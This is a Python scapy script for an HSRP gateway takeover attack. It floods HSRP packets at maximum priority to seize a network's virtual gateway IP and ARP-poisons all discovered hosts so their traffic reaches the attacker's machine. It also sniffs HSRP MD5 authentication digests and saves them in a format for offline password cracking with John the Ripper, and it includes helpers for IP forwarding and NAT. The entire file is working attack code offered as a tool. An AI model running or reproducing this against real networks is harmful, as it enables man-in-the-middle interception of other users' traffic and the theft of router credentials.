from scapy.all import *
from argparse import ArgumentParser
from multiprocessing import Process
from netaddr import IPAddress
import os


"""
Constants for HSRP
"""
PORT = 1985
MULTICAST_IP = "224.0.0.2"
PRIORITY = 255
GROUP = 0
AUTH = "cisco"
VERSION = {"224.0.0.2": "1",
		   "224.0.0.102": "2"}
MULTICAST_MAC = "01:00:5e:00:00:{}"
VIRTUAL_IP = "192.168.1.1"

"""
Constants for ARP Poisoning
"""
DEFAULT_GW = "192.168.1.2"
IFACE = "eth0"

"""
Constants for argument parser
"""
DESCRIPTION = """
Use the --sniff argument to display any sniffed packets.

Use the --takeover argument to takeover begin sending HSRP packets to takeover.
Optional arguments to supply are:
--iface <iface>
--group <group_id>
--ip <virtual_ip>
--auth <passphrase>
--md5_auth
--outer_vlan <id>
--inner_vlan <id>
--src_ip <source_ip>
--exclude <filename (IPs to be excluded)
--gateway <router_physical_ip>

ARP requests for the virtual IP are responded to in conjunction with the takeover.
"""

"""
Constants for HSRP MD5 authentication
"""
OUT_FILE = "hsrp2john.txt"
IN_FILE = "hsrpmd5.config"
HSRP_MD5_FORMAT = """
type=
len=
algo=
padding=
flags=
sourceip=
keyid=
authdigest=
"""


parser = ArgumentParser(description=DESCRIPTION)
parser.add_argument("--sniff", help="Sniff HSRP packets for 10 seconds.", action="store_true")
parser.add_argument("--takeover", help="Begin the takeover.", action="store_true")
parser.add_argument("--iface", dest="iface", help="Interface to attack on. Default is eth0.", type=str)
parser.add_argument("--group", dest="grp", help="The group ID to takeover. Default is 0.", type=str)
parser.add_argument("--ip", dest="ip", help="The virtual IP to takeover. Default is 192.168.1.1", type=str)
parser.add_argument("--auth", dest="auth", help="The passphrase used for authentication. Default is cisco.", type=str)
parser.add_argument("--md5_auth", dest="md5_auth", help="Specifies whether to append a HSRPmd5 layer.", action="store_true")
parser.add_argument("--outer_vlan", dest="ovlan", help="The outer vlan tag ID.", type=int)
parser.add_argument("--inner_vlan", dest="ivlan", help="The inner vlan tag ID.", type=int)
parser.add_argument("--src_ip", dest="src", help="The source IP used to send the HSRP packet.", type=str)
parser.add_argument("--exclude", dest="exclude", help="Exclude specific IP addresses stored in a file.", type=str)
parser.add_argument("--gateway", dest="gateway", help="The gateway to forward the traffic to.", type=str)
args = parser.parse_args()


def main():
	"""
	Main function to run the takeover.
	"""
	change_defaults()
	
	verbose = True

	# Arguments not supplied
	if not (args.sniff or args.takeover):
		parser.print_help()
		exit(1)

	if args.sniff:
		print("[+] Starting sniff on interface {}...".format(IFACE))
		pkts = sniff(iface=IFACE, timeout=10,
		             filter="udp src port 1985 and udp src port 1985", prn=print_hsrp)

		if not pkts:
			print("[-] No HSRP packets sniffed.")
			exit(1)

		print("[+] HSRP packets found.")

	if args.takeover:
		# HSRP flooding
		P1 = Process(target=hsrp_takeover, args=(IFACE, args.grp, args.ip,
		             args.auth, args.ovlan, args.ivlan, args.md5_auth, args.src))
		P1.start()
		print("[+] HSRP takeover process started.")

		# Run terminal commands for attacker PC
		# enable_ip_route()
		# run_add_commands(DEFAULT_GW)

		# Get list of IPs to be excluded from ARP poison attack
		if args.exclude:
			with open(args.exclude, "r") as f:
				excluded_ip_list = [line.strip() for line in f.readlines()]
		
		# Get Network information
		network_info = get_network_info(IFACE)
		network = network_info[1]

		# Get MAC address of current interface
		self_mac = get_if_hwaddr(IFACE)

		# Get MAC address of Gateway IP
		host_mac = get_mac(DEFAULT_GW)

		# Discover hosts on network using ARP scan
		network_ip_list = host_discovery(network)

		try:
			print("[+] Conducting ARP Poisoning...")
			while True:
				spoof(network_ip_list, excluded_ip_list, VIRTUAL_IP, host_mac, self_mac, verbose)
				time.sleep(1)
		except KeyboardInterrupt:
			print("\n[!] Detected CTRL+C ! restoring the network, please wait...")
			restore(network_ip_list, excluded_ip_list, VIRTUAL_IP, host_mac, verbose)
			P1.terminate()
		# print([+] Responding to ARP requests...")


def change_defaults():
	"""
	Changes the defaults to user-supplied values.
	:return: None
	"""
	global IFACE
	global DEFAULT_GW
	global GROUP
	global VIRTUAL_IP
	global AUTH
	
	if args.iface:
		IFACE = args.iface
		print("[*] Iface changed to {}".format(IFACE))
	
	if args.gateway:
		DEFAULT_GW = args.gateway
		print("[*] Gateway changed to {}".format(DEFAULT_GW))
	
	if args.grp:
		GROUP = args.grp
		print("[*] Group changed to {}".format(GROUP))
	
	if args.ip:
		VIRTUAL_IP = args.ip
		print("[*] Virtual IP changed to {}".format(VIRTUAL_IP))
	
	if args.md5_auth:
		print("[*] MD5 authentication layer will be added.")
		print("[*] Auth set to non-default.")
		AUTH = b"\x00" * 8
	elif args.auth:
		AUTH = args.auth
		print("[*] Auth changed to {}".format(AUTH))
		
	
def enable_ip_route(verbose=True):
    """
    Enables IP forwarding
    """
    if verbose:
        print("[!] Enabling IP Routing...")
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)
    if verbose:
        print("[!] IP Routing enabled.\n")

def run_add_commands(gateway_physical_ip, verbose=True):
	"""
	Runs additonal terminal commands
	"""
	if verbose:
		print("[!] Running additional commands on Terminal...")
	os.system("sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
	os.system("route add default gw " + gateway_physical_ip)
	if verbose:
		print("[!] Commands finished running.\n")


def get_network_info(iff):
	"""Gets current network info based on interface supplied"""
	for net, msk, gw, iface, ip, met in conf.route.routes:
		if iface != iff:
			continue
		netmsk = str(IPAddress(ltoa(msk)).netmask_bits())
		network_id = ltoa(net) + "/" + netmsk
		network_info = [iface, network_id, ltoa(msk), ip]
		print("Network Info = ", network_info, end="\n\n")
	return network_info

def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def host_discovery(network):
    """
    Discover active hosts on the network using a ARP scan
    """
    network_ip_list = []
    print("[+] Activating Host Discovery (ARP scan)..")
    answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, iface="eth0", inter=0.1)
    for sent, received in answered:
        network_ip_list.append((received[ARP].psrc, received[ARP].hwsrc))
    print("[!] Active addresses in Network: ")
    for i in range(len(network_ip_list)):
        print(i+1,")", network_ip_list[i][0])
    print("[+] Finished ARP scan\n")
    return network_ip_list

def spoof(network_ip_list, excluded_ip_list, host_ip, host_mac, self_mac, verbose=True):
    """
    network_ip_list = list of active addresses in the network
    Constantly poison ARP cache of "target_ip" in "network_ip_list", saying that "host_ip" is at "self_mac"
    """
    for i in range(len(network_ip_list)):
        target_ip, target_mac = network_ip_list[i][0], network_ip_list[i][1]
        if (target_ip != host_ip) & (target_ip not in excluded_ip_list): 
            packet_list = []
            # poison target, saying that gateway ip is at attacker mac
            packet_list.append(ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=self_mac, op='is-at'))
            # poison host, saying that target ip is at attacker mac
            # packet_list.append(ARP(pdst=host_ip, hwdst=host_mac, psrc=target_ip, hwsrc=self_mac, op='is-at'))
            for i in range(len(packet_list)):
                send(packet_list[i], verbose=0)
                if verbose:
                    if (i==0):
                        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
                    # else:
                    #     print("[+] Sent to {} : {} is-at {}".format(host_ip, target_ip, self_mac))

def restore(network_ip_list, excluded_ip_list, host_ip, host_mac, verbose=True):
    """
    Restore network to original state
    """
    for i in range(len(network_ip_list)):
        target_ip, target_mac = network_ip_list[i][0], network_ip_list[i][1]
        if (target_ip != host_ip) & (target_ip not in excluded_ip_list):
            packet_list = []
	    # Restore ARP cache of Target
            packet_list.append(ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op='is-at'))
	    # Restore ARP cache of Host
            # packet_list.append(ARP(pdst=host_ip, hwdst=host_mac, psrc=target_ip, hwsrc=target_mac, op='is-at'))
            for i in range(len(packet_list)):
                send(packet_list[i], verbose=0, count=7)
                if verbose:
                    if (i==0):
                        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
                    # else:
                    #     print("[+] Sent to {} : {} is-at {}".format(host_ip, target_ip, target_mac))


def hsrp_takeover(iface, grp, ip, auth, ovlan, ivlan, md5_auth, src):
	"""
	Sends HSRP packets every 3 seconds.
	:param grp: group number
	:param ip: virtual ip
	:param auth: passphrase used for authentication
	:param ovlan: outer vlan tag id
	:param ivlan: inner vlan tag id
	:return: None
	"""
	global GROUP
	global AUTH
	global VIRTUAL_IP
	
	vlan_tags = None

	print("[+] Initiating HSRP takeover...")


	
	if ovlan:
		vlan_tags = Dot1Q(vlan=ovlan)
		print("[*] Outer vlan ID set to {}".format(GROUP))
	
	if ivlan:
		vlan_tags /= Dot1Q(vlan=ivlan)
		print("[*] Inner vlan ID changed to {}".format(GROUP))
		

	# Building the packet layers
	frame = Ether(dst=MULTICAST_MAC.format(GROUP))
	if src:
		packet = IP(src=src, dst=MULTICAST_IP, ttl=1)
	else:
		packet = IP(dst=MULTICAST_IP, ttl=1)
	segment = UDP(sport=PORT, dport=PORT)
	hsrp_layer = HSRP(group=int(GROUP), priority=PRIORITY, auth=AUTH, virtualIP=VIRTUAL_IP)
	
	if vlan_tags:
		payload = frame/vlan_tags/packet/segment/hsrp_layer
	else:
		payload = frame/packet/segment/hsrp_layer
	
	# HSRPmd5 layer
	if md5_auth:
		# Read the config file
		hsrpmd5_layer = HSRPmd5()
		try:
			with open(IN_FILE, "r") as fr:
				cfg = fr.read().strip().split("\n")
				print(cfg)
				if cfg[0].split("=")[1]:
					hsrpmd5_layer.type = int(cfg[0].split("=")[1])
				
				if cfg[1].split("=")[1]:
					hsrpmd5_layer.len = int(cfg[1].split("=")[1])
				
				if cfg[2].split("=")[1]:
					hsrpmd5_layer.algo = int(cfg[2].split("=")[1])
				
				if cfg[3].split("=")[1]:
					hsrpmd5_layer.padding = cfg[3].split("=")[1]
				
				if cfg[4].split("=")[1]:
					hsrpmd5_layer.flags = cfg[4].split("=")[1]
				
				if cfg[5].split("=")[1]:
					hsrpmd5_layer.sourceip = cfg[5].split("=")[1]
				
				if cfg[6].split("=")[1]:
					hsrpmd5_layer.keyid = int(cfg[6].split("=")[1])
				
				if cfg[7].split("=")[1]:
					hsrpmd5_layer.authdigest = bytes.fromhex(cfg[7].split("=")[1])
			
			
			payload /= hsrpmd5_layer
		except FileNotFoundError:
			print("[-] Config file not found. Creating...")
			
			with open(IN_FILE, "w") as fw:
				fw.write(HSRP_MD5_FORMAT)
			
			exit(1)
		except Exception as e:
			print("[-] Error: {}".format(e))
			exit(1)
	

	print("[+] Starting HSRP flooding...")
	print(payload.show())
	sendp(payload, iface=IFACE, loop=1, inter=3)


def print_hsrp(pkt):
	"""
	Prints the HSRP packets on terminal for viewing. If HSRP md5 authentication is detected, it is outputted to a file.
	:param pkt: hsrp packet captured
	:return: string output to print on terminal
	"""
	
	# Sanity check, make sure it is actually a HSRP packet
	if not pkt.haslayer(HSRP):
		return ""
	
	# Check if HSRP packet has md5 authentication
	if pkt.haslayer(HSRPmd5):
		print("[*] HSRP with MD5 authentication detected. Outputting to {}".format(OUT_FILE))
		with open("hsrp2john.txt", "a") as fw:
			# Split the HSRP packet into 2, one with HSRP fields without the authdigest, another with just the authdigest
			hsrp_pkt = bytes(pkt[HSRP]).hex()
			hsrp = hsrp_pkt[:-32]
			authdigest = hsrp_pkt[-32:]
			
			# Pad the HSRP portion to 50 bytes
			for i in range(len(hsrp), 100):
				hsrp += '0'
			
			fw.write("$hsrp${}${}\n\n".format(hsrp, authdigest))
	
	return """
	{} \n
	HSRP version: {} \n
	Source IP: {}
	""".format(pkt[HSRP].show(), VERSION[pkt[IP].dst], pkt[IP].src)



if __name__ == '__main__':
	main()

